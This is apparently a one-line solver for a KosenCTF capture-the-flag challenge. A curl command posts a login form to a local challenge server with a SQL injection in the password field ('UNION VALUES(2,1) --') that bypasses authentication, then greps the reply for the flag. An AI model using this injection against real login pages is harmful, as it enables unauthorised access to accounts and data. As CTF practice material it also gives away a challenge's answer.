curl -s -X POST "http://${HOST:-localhost}:${PORT:-14003}/" --data "username=takoyaki&password='UNION VALUES(2,1) --" | grep -oP "KosenCTF{.+?}"
